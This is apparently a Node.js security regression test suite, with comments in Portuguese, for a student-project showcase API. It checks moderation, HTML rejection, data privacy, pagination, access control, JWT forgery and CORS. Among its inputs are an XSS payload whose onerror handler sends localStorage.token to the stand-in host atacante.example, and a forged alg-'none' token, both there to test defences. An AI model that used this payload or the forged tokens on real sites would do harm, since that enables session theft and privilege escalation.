// Testes de segurança: falhas corrigidas (regressão) e controles que precisam continuar valendo.
// A aplicação real (app.js) roda com o banco simulado.
const { test, describe, before, after, beforeEach, mock } = require('node:test');
const assert = require('node:assert/strict');
const { randomBytes, randomUUID } = require('node:crypto');

process.env.NODE_ENV = 'test';
process.env.JWT_SECRET = randomBytes(48).toString('hex');
process.env.JWT_EXPIRES_IN = '1d';
process.env.CREATOR_ALLOWED_DOMAINS = '@ifsc.edu.br,@aluno.ifsc.edu.br';
process.env.CLOUDINARY_CLOUD_NAME = 'techub-test';
process.env.CLOUDINARY_API_KEY = 'test-key';
process.env.CLOUDINARY_API_SECRET = 'test-secret';
process.env.DB_USER ??= 'teste';
process.env.DB_PASSWORD ??= 'teste';
process.env.DB_NAME ??= 'teste';
process.env.DB_HOST ??= 'localhost';
process.env.FRONTEND_URL = 'http://localhost:5173';

const sequelize = require('../src/config/database');
const { User } = require('../src/models');
const Project = require('../src/models/Project');
const ProjectMedia = require('../src/models/ProjectMedia');
const ProjectTechnology = require('../src/models/ProjectTechnology');
const ProjectCollaborator = require('../src/models/ProjectCollaborator');
const { signToken } = require('../src/utils/jwt');

const VIDEO = [{ url: 'https://youtu.be/dQw4w9WgXcQ', mediaType: 'video' }];

let server;
let baseUrl;
let users;
let projects;
let captured;

function addUser(role, extra = {}) {
  const user = User.build({ name: `${role} teste`, email: `${role}-${randomUUID().slice(0, 6)}@aluno.ifsc.edu.br`, password: 'x', role, ...extra });
  users.set(user.id, user);
  return user;
}

function tokenOf(user) {
  return signToken({ sub: user.id, role: user.role });
}

function call(method, url, { user, token, body, headers = {} } = {}) {
  const auth = token || (user && tokenOf(user));
  return fetch(baseUrl + url, {
    method,
    headers: { 'Content-Type': 'application/json', ...(auth && { Authorization: `Bearer ${auth}` }), ...headers },
    body: body && JSON.stringify(body),
  });
}

function addProject(owner, approvalStatus) {
  const project = Project.build({
    id: randomUUID(), title: 'Projeto', description: 'Descrição original do projeto', ownerId: owner.id, approvalStatus,
  });
  mock.method(project, 'update', async (values) => {
    captured.update = values;
    Object.assign(project.dataValues, values);
    return project;
  });
  projects.set(project.id, project);
  return project;
}

before(async () => {
  mock.method(User, 'findByPk', async (id) => users.get(id) || null);
  mock.method(User, 'findOne', async ({ where }) => [...users.values()].find((u) => u.email === where.email) || null);
  mock.method(User, 'findAll', async (options) => { captured.userFindAll = options; return []; });
  mock.method(User.prototype, 'save', async function save() {
    await User.runHooks('beforeSave', this, {});
    users.set(this.id, this);
    return this;
  });
  mock.method(sequelize, 'transaction', async (callback) => {
    const transaction = { LOCK: { UPDATE: 'UPDATE' }, commit: async () => {}, rollback: async () => {} };
    return typeof callback === 'function' ? callback(transaction) : transaction;
  });
  mock.method(Project, 'findByPk', async (id) => projects.get(id) || null);
  mock.method(Project, 'findAndCountAll', async (options) => { captured.list = options; return { count: 0, rows: [] }; });
  mock.method(Project, 'create', async (data) => { captured.create = data; return Project.build({ ...data, id: randomUUID() }); });
  mock.method(ProjectTechnology, 'destroy', async () => 0);
  mock.method(ProjectTechnology, 'bulkCreate', async () => []);
  mock.method(ProjectCollaborator, 'destroy', async () => 0);
  mock.method(ProjectCollaborator, 'bulkCreate', async () => []);
  mock.method(ProjectCollaborator, 'findOne', async () => null);
  mock.method(ProjectMedia, 'destroy', async () => 0);
  mock.method(ProjectMedia, 'bulkCreate', async (records) => records);

  // app.js real: Helmet, CORS, rotas, middlewares, validadores e controllers.
  const app = require('../src/app');
  server = app.listen(0, '127.0.0.1');
  await new Promise((resolve) => server.once('listening', resolve));
  baseUrl = `http://127.0.0.1:${server.address().port}/api`;
});

after(async () => {
  server.closeAllConnections();
  await new Promise((resolve) => server.close(resolve));
  mock.restoreAll();
});

beforeEach(() => {
  users = new Map();
  projects = new Map();
  captured = {};
});

describe('moderação: edição de projeto aprovado', () => {
  test('editar um projeto já aprovado devolve ele para a fila da moderação', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'approved');
    const res = await call('PUT', `/projects/${project.id}`, {
      user: owner,
      body: { description: 'Conteúdo trocado depois da aprovação, sem nova análise' },
    });
    assert.equal(res.status, 200);
    assert.equal(captured.update.approvalStatus, 'pending', 'o projeto continuou aprovado e público sem nova análise');
  });
});

describe('HTML nos textos do projeto', () => {
  test('a API recusa HTML na descrição e no título', async () => {
    const creator = addUser('creator');
    const payload = 'Projeto legal <img src=x onerror="fetch(`//atacante.example/?t=`+localStorage.token)">';
    for (const body of [{ title: 'XSS', description: payload }, { title: '<b>XSS</b>', description: 'Descrição normal' }]) {
      const res = await call('POST', '/projects', { user: creator, body: { ...body, media: VIDEO } });
      assert.equal(res.status, 400);
    }
    assert.equal(captured.create, undefined);
  });

  test('a edição também recusa HTML', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'pending');
    const res = await call('PUT', `/projects/${project.id}`, { user: owner, body: { description: '<script>alert(1)</script>' } });
    assert.equal(res.status, 400);
    assert.equal(captured.update, undefined);
  });
});

describe('dados pessoais na listagem pública', () => {
  test('GET /projects (sem login) não busca o e-mail do autor', async () => {
    const res = await call('GET', '/projects');
    assert.equal(res.status, 200);
    const author = captured.list.include.find((item) => item.as === 'author');
    assert.ok(!author.attributes.includes('email'), 'a listagem pública retorna o e-mail de todos os autores');
  });
});

describe('paginação da listagem pública', () => {
  test('GET /projects?limit=100000 é limitado a 100 pelo servidor', async () => {
    const res = await call('GET', '/projects?limit=100000');
    assert.equal(res.status, 200);
    assert.equal(captured.list.limit, 100);
  });

  test('page/limit inválidos não viram erro 500', async () => {
    const res = await call('GET', '/projects?limit=abc&page=-3');
    assert.notEqual(res.status, 500);
    assert.ok(Number.isFinite(captured.list.limit) && captured.list.offset >= 0,
      `limit=${captured.list.limit} offset=${captured.list.offset} vão direto para o banco`);
  });
});

// ---- Controles que já estão corretos (devem continuar passando) ----

describe('controles de acesso', () => {
  test('cadastro público recusa o campo role (não cria super_admin)', async () => {
    const res = await call('POST', '/auth/register', {
      body: { name: 'x', email: 'x@aluno.ifsc.edu.br', password: 'Senha1234', accountType: 'creator', role: 'super_admin' },
    });
    assert.equal(res.status, 400);
  });

  test('cadastro de criador exige domínio institucional', async () => {
    const res = await call('POST', '/auth/register', {
      body: { name: 'x', email: 'x@gmail.com', password: 'Senha1234', accountType: 'creator' },
    });
    assert.equal(res.status, 400);
  });

  test('visitante não cadastra projeto', async () => {
    const res = await call('POST', '/projects', { user: addUser('visitor'), body: { title: 'x', description: 'y', media: VIDEO } });
    assert.equal(res.status, 403);
  });

  test('criador que não é dono nem colaborador não edita projeto de outro', async () => {
    const project = addProject(addUser('creator'), 'approved');
    const res = await call('PUT', `/projects/${project.id}`, { user: addUser('creator'), body: { title: 'invadido' } });
    assert.equal(res.status, 403);
  });

  test('criador não exclui projeto de outro', async () => {
    const project = addProject(addUser('creator'), 'approved');
    const res = await call('DELETE', `/projects/${project.id}`, { user: addUser('creator') });
    assert.equal(res.status, 403);
  });

  test('criador não consegue se auto-aprovar pelo PUT (approvalStatus é descartado)', async () => {
    const owner = addUser('creator');
    const project = addProject(owner, 'pending');
    const res = await call('PUT', `/projects/${project.id}`, { user: owner, body: { title: 'novo', approvalStatus: 'approved' } });
    assert.equal(res.status, 200);
    assert.notEqual(captured.update.approvalStatus, 'approved');
  });

  test('criador não acessa a área de moderação', async () => {
    const res = await call('PATCH', `/admin/projects/${randomUUID()}/approve`, { user: addUser('creator'), body: {} });
    assert.equal(res.status, 403);
  });

  test('projeto pendente não aparece para quem não é dono/colaborador', async () => {
    const project = addProject(addUser('creator'), 'pending');
    mock.method(Project, 'findByPk', async () => project, { times: 1 });
    const res = await call('GET', `/projects/${project.id}`, { user: addUser('creator') });
    assert.equal(res.status, 404);
  });

  test('busca de colaboradores devolve só id e nome (sem e-mail)', async () => {
    const res = await call('GET', '/projects/collaborators/search?q=ma', { user: addUser('creator') });
    assert.equal(res.status, 200);
    assert.deepEqual(captured.userFindAll.attributes, ['id', 'name']);
  });

  test('token assinado com outro segredo é recusado', async () => {
    const jwt = require('jsonwebtoken');
    const user = addUser('super_admin');
    const forged = jwt.sign({ sub: user.id, role: 'super_admin' }, 'segredo-adivinhado');
    const res = await call('GET', '/auth/me', { token: forged });
    assert.equal(res.status, 401);
  });

  test('token com alg "none" é recusado', async () => {
    const user = addUser('super_admin');
    const b64 = (obj) => Buffer.from(JSON.stringify(obj)).toString('base64url');
    const forged = `${b64({ alg: 'none', typ: 'JWT' })}.${b64({ sub: user.id, role: 'super_admin' })}.`;
    const res = await call('GET', '/auth/me', { token: forged });
    assert.equal(res.status, 401);
  });
});

describe('CSRF e CORS', () => {
  test('a API ignora cookies: sem o cabeçalho Authorization a requisição é recusada', async () => {
    const res = await call('DELETE', `/projects/${randomUUID()}`, { headers: { Cookie: `token=${tokenOf(addUser('creator'))}` } });
    assert.equal(res.status, 401);
  });

  test('CORS não libera origens fora da lista', async () => {
    const res = await fetch(`${baseUrl}/projects`, {
      method: 'OPTIONS',
      headers: { Origin: 'https://site-malicioso.example', 'Access-Control-Request-Method': 'PUT' },
    });
    assert.equal(res.headers.get('access-control-allow-origin'), null);
  });

  test('CORS libera a origem do frontend', async () => {
    const res = await fetch(`${baseUrl}/projects`, {
      method: 'OPTIONS',
      headers: { Origin: 'http://localhost:5173', 'Access-Control-Request-Method': 'PUT' },
    });
    assert.equal(res.headers.get('access-control-allow-origin'), 'http://localhost:5173');
  });
});
